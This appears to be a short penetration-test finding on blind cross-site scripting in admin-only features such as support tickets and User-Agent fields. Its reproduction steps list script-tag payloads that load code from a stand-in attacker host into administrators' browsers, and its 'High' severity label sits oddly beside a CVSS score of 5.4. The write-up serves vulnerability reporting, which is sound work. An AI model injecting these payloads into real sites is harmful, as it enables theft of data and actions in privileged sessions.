# XSS - Blind Cross-Site Scripting

**Title:** Blind XSS in Internal or Admin-Only Features

**Severity:** High

**Impact:** High

**Exploitability:** Medium

**CVSS Base Score:** 5.4

**CVSS v3 Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N

**Vulnerability Type:** Cross-Site Scripting

**Target:** Contact forms, support tickets, admin logs, User-Agent fields

## Impact

Script executes in privileged contexts (admin browsers), allowing internal data theft or actions.

## Description

Payload stored or reflected only for specific users (e.g. admins), detected via out-of-band callbacks.

## Steps to Reproduce

Inject beacon:

<script src="http://attacker-ip/script.js"></script>

Use unique paths per field:

<script src=http://attacker-ip/fullname></script>

Advanced:

<script src=http://attacker-ip></script>

javascript:eval payloads, $.getScript.

## Recommendation

Sanitize all inputs, monitor for beacons, CSP.

## References

PayloadsAllTheThings and blind XSS techniques.